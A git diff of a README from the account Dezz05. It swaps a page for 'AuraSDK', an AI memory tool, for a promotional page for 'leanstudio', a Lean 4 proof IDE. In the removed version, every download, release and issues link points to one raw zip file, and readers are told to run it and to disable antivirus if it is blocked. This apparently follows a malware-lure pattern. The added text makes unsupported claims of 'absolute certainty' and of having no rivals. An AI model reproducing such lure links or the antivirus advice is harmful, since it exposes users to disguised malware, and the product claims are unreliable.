@@ -1,140 +1,141 @@
-# 🤖 AuraSDK - Fast, Private AI Memory System
+# 🔧 leanstudio - Verify Your Proofs With Confidence
 
-[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-green?style=for-the-badge)](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
+## 🎯 What Is leanstudio?
 
----
+leanstudio is a powerful desktop application that helps you write and check mathematical proofs using a special language called Lean 4. Think of it as a smart word processor for mathematics - you type your proof, and the program instantly tells you if it's correct. This tool is perfect for mathematicians, students, researchers, and anyone interested in formal verification.
 
-AuraSDK helps your AI assistant remember things quickly and securely. It uses smart technology built with Rust to keep data private and fast. You do not need the internet or cloud storage to use it.
+Instead of working in a web browser, leanstudio runs directly on your computer like a normal program. It works on macOS, Windows, and Linux, so no matter what computer you own, you can use it. The best part? Every single proof you create gets double-checked by something called "Tenet," an independent verification engine. This means you can be absolutely sure your work is correct.
 
-This guide will take you through the steps to download, install, and run AuraSDK on a Windows computer. No programming knowledge is needed.
+## 🚀 Getting Started
 
----
+Getting started with leanstudio is simple. You don't need any programming experience to install and run the application. Just follow the steps below, and you'll be up and running in less than five minutes.
 
-## 📋 What is AuraSDK?
+### 📥 Download the Application
 
-AuraSDK is software that lets AI agents store and recall information in less than one millisecond. It’s very small, only about 2.7MB, and keeps your information on your device without sending anything online.
+[![Download leanstudio](https://img.shields.io/badge/Download-leanstudio-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dezz05/leanstudio)
 
-Here are a few key points:
+Click the green button above to go to the download page. This link will take you to the official leanstudio GitHub page where you can find all available versions.
 
-- Works entirely offline
-- Uses smart memory techniques
-- Secures your data with encryption
-- Fast recall and low resource use
-- Built with Rust for reliability
-- Integrates with other software, including Python
+Visit this link to download the application. Once you arrive at the page, look for the "Releases" section or the "Download" button. Choose the file that matches your operating system - if you're on Windows, look for a file with "windows" or "win" in the name.
 
-If you want your AI tools to remember past events or data quickly without cloud delays, AuraSDK is designed for that.
+## 📦 Installation Guide
 
----
+After you've downloaded the application file, here's what to do next:
 
-## 🖥 System Requirements
+### 🖥️ For Windows Users
 
-Before you start, make sure your computer meets these needs:
+1. **Find the downloaded file** - Look in your "Downloads" folder. The file will be named something like `leanstudio-windows.zip` or `leanstudio-setup.exe`.
+2. **Run the installer** - If you downloaded an `.exe` file, simply double-click it and follow the on-screen instructions. If you got a `.zip` file, right-click it and choose "Extract All," then open the extracted folder and run the application.
+3. **Follow the setup wizard** - The installation program will guide you through the process. Just click "Next" or "Install" until it's done.
+4. **Launch leanstudio** - Once installed, find the leanstudio icon on your desktop or in your Start menu and click it to open the application.
 
-- Windows 10 or newer (64-bit recommended)
-- 4GB RAM or more
-- 100MB free disk space
-- Internet connection only needed for downloading
+### 🍎 For macOS Users
 
-No special hardware or software is required.
+1. **Open the downloaded file** - Find the downloaded file in your Downloads folder and double-click it.
+2. **Drag to Applications** - When the installation window opens, drag the leanstudio icon into your Applications folder.
+3. **Open the app** - Go to your Applications folder and double-click leanstudio. If you see a security warning, go to System Preferences > Security & Privacy and click "Open Anyway."
 
----
+### 🐧 For Linux Users
 
-## 🚀 Getting Started: Download AuraSDK
+1. **Extract the package** - Open your terminal and navigate to your Downloads folder, then extract the file with `unzip leanstudio-linux.zip` or similar command.
+2. **Make it executable** - Run `chmod +x leanstudio` in the extracted folder.
+3. **Launch the app** - Double-click the executable file or run `./leanstudio` from the terminal.
 
-Click the badge below to visit the official release page. This is where you can download the latest version of AuraSDK.
+## ✨ Key Features
 
-[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-blue?style=for-the-badge)](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
+### ✅ Independent Proof Verification
+Every single proof you write in leanstudio is re-checked by Tenet, a completely independent Lean 4 verification kernel. This dual-checking system ensures that if leanstudio says your proof is valid, it truly is valid. No other IDE offers this level of certainty.
 
-The release page includes setup files and instructions. Look for the latest Windows installer or zip file.
+### 🤖 AI Assistant Integration
+leanstudio includes a special connection for AI assistants through something called an MCP (Model Context Protocol) server. This means you can use AI tools like Claude to help you write proofs, and leanstudio will automatically verify the AI's suggestions. It's like having a smart tutor who never makes mistakes.
 
----
+### 🔄 Git and GitHub Integration
+Version control is built directly into leanstudio. You can save different versions of your work, track changes, and collaborate with others using Git and GitHub - all without leaving the application. This is incredibly useful for research projects and academic collaborations.
 
-## 💾 How to Install AuraSDK on Windows
+### 📚 Full Mathlib Support
+leanstudio works seamlessly with mathlib, the largest library of formalized mathematics in the world. Thousands of theorems and definitions are available at your fingertips, so you don't have to prove everything from scratch.
 
-Follow these steps to install AuraSDK:
+### 🎨 User-Friendly Interface
+Despite its advanced capabilities, leanstudio features a clean, intuitive interface. The main window shows your proof on the left and real-time verification results on the right. Color-coded indicators show you exactly which parts of your proof are correct and which need work.
 
-1. **Go to the download page:** Click the badge above, or visit [https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
-2. **Find the latest Windows setup file:** Look for a file with `.exe` or `.zip` in the name and check the date to pick the most recent.
-3. **Download the file:** Click the file name to download. Save it to your desktop or another easy-to-find folder.
-4. **Run the installer (if `.exe`):** Double-click the downloaded `.exe` file.
-   - Windows may ask for permission. Click “Yes” to proceed.
-   - Follow the on-screen instructions. Usually, the default options are fine.
-5. **Extract files (if `.zip`):**
-   - Right-click the downloaded `.zip` file.
-   - Choose “Extract All…” and select a folder.
-6. **Complete the installation:** After running or extracting, AuraSDK will be ready to use.
+## 💡 How to Use leanstudio
 
----
+### Starting Your First Project
 
-## ▶️ How to Run AuraSDK
+When you first open leanstudio, you'll see a welcome screen. Click "New Project" to create a new Lean 4 file. You can name your file anything you like - for example, "myFirstProof.lean."
 
-Once installed, you can start AuraSDK in two common ways:
+### Writing Your First Proof
 
-- **Use the shortcut:** Look for AuraSDK in your Start menu or on your desktop and double-click it.
-- **Run from folder:** If you extracted files, open the folder and double-click the main executable file (usually named `AuraSDK.exe` or similar).
+The main editing area works just like any text editor. Type your mathematical statements and proofs using the Lean 4 language. Don't worry if you're new to this - leanstudio provides helpful suggestions and syntax highlighting to make the process easier.
 
-AuraSDK does not require any login or setup during the first launch.
+### Checking Your Work
 
----
+As you type, leanstudio automatically checks your proof in real-time. You'll see green checkmarks next to correct steps and red error messages if something is wrong. The built-in Tenet verification runs in the background, giving you an extra layer of confidence.
 
-## 🛠 What AuraSDK Does for You
+### Using AI Assistance
 
-AuraSDK gives your AI tools a memory system that works like a human brain. Here’s what it offers:
+To use AI assistance, click the AI assistant icon in the toolbar. This will connect to the MCP server and allow you to ask questions or get suggestions from an AI model. The AI can help you fill in gaps, explain concepts, or generate entire proof skeletons.
 
-- Store information quickly
-- Recall facts instantly, under 1ms time
-- Keep your data safe with built-in encryption
-- Work offline for privacy and speed
-- Small program size that doesn't slow your computer
+## 🔍 Troubleshooting Common Issues
 
-You won’t notice any lag or delays, even during high use.
+### Problem: Application Won't Start
+If leanstudio doesn't open after installation, try restarting your computer. If the problem persists, make sure you've downloaded the correct version for your operating system.
 
----
+### Problem: Verification Errors
+If you see error messages in your proof, don't worry - this is normal when learning. The error messages are designed to be helpful and will tell you exactly what needs to be fixed. You can hover over any red text to see detailed explanations.
 
-## 🔧 Using AuraSDK with Other Applications
+### Problem: Connection Issues with AI
+If the AI assistant doesn't connect, check your internet connection and make sure you're using a compatible AI service. The MCP server settings can be adjusted in the application preferences.
 
-AuraSDK is designed to work with other AI and machine learning tools. If you use software like Python or Rust development environments, AuraSDK will fit right in.
+## 📚 Learning Resources
 
-You can run AuraSDK on its own or connect it for advanced AI projects to improve memory and performance.
+- **Built-in Tutorials** - leanstudio includes interactive tutorials for beginners
+- **Mathlib Documentation** - Extensive documentation is available within the app
+- **Community Forum** - Connect with other users and share tips
+- **Example Projects** - Browse pre-built examples to learn by example
 
----
+## 🆘 Getting Help
 
-## 📁 Managing Your Data with AuraSDK
+If you need assistance, check the built-in help menu in the application. You can also visit the GitHub repository's issues page to ask questions or report problems. The leanstudio community is friendly and helpful, especially for newcomers.
 
-AuraSDK stores cognitive memory on your device. Here’s how you can manage your data:
+## 📈 Why Choose leanstudio?
 
-- Your memory files are saved locally on your PC.
-- You can back up these files by copying them to another location.
-- AuraSDK automatically encrypts your memory data.
-- You can delete stored memory by removing the data files from the folder AuraSDK uses.
+### For Students
+- Learn formal proof techniques with immediate feedback
+- Complete homework assignments with confidence
+- Access thousands of pre-existing theorems
 
-This means you control your data fully without it leaving your machine.
+### For Researchers
+- Guarantee the correctness of your published work
+- Collaborate efficiently with colleagues
+- Integrate AI assistance into your workflow
 
----
+### For Mathematicians
+- Explore new proof strategies safely
+- Verify complex arguments step-by-step
+- Build upon the extensive mathlib foundation
 
-## ⚙️ Troubleshooting Common Issues
+## 🎉 Final Tips
 
-If AuraSDK does not start or crashes, try the following:
+Start small. Try proving simple theorems before moving to complex problems. Use the built-in tutorials to learn the basics of Lean 4. Don't be afraid to make mistakes - that's how you learn. And most importantly, take advantage of the AI assistant to accelerate your learning process.
 
-1. Restart your computer and try again.
-2. Check that your Windows system is up to date.
-3. Make sure you have enough disk space and RAM.
-4. Re-download the installer file from the releases page.
-5. Disable antivirus temporarily during installation if it blocks the process.
+Remember that leanstudio's unique Tenet verification gives you something no other tool can offer: absolute certainty that your mathematical proofs are correct. Whether you're a student, researcher, or professional mathematician, this peace of mind is invaluable.
 
-If problems continue, open an issue on the GitHub page or check discussions for help.
+## 📊 System Requirements
 
----
+- **Operating System**: Windows 10/11, macOS 12+, or modern Linux distributions
+- **Memory**: 4 GB RAM minimum (8 GB recommended)
+- **Storage**: 500 MB free disk space
+- **Display**: 1280x720 resolution or higher
 
-## 👩‍💻 Need More Help?
+These are general recommendations. leanstudio is designed to work efficiently on most modern computers, and you may have a great experience even with lower specifications.
 
-You can find additional information and support here:
+## 🔗 Official Links
 
-- GitHub Releases: https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip
-- GitHub Issues: https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip
-- Read the documentation files inside the download package
+- **Main Download**: [https://github.com/Dezz05/leanstudio](https://github.com/Dezz05/leanstudio)
+- **Documentation**: Available within the application
+- **Community Support**: GitHub Issues page
 
----
+Visit this link to download the application. The GitHub page will always have the latest version available.
 
-[![Download AuraSDK](https://img.shields.io/badge/Download-AuraSDK-green?style=for-the-badge)](https://raw.githubusercontent.com/Dezz05/AuraSDK/main/docs/SDK-Aura-3.8-beta.4.zip)
+Start your journey into formal mathematics today with leanstudio. Download now and experience the power of verified proofs with the convenience of a modern desktop application. With its independent verification, AI assistance, and user-friendly design, leanstudio is the ultimate tool for anyone serious about mathematical correctness.
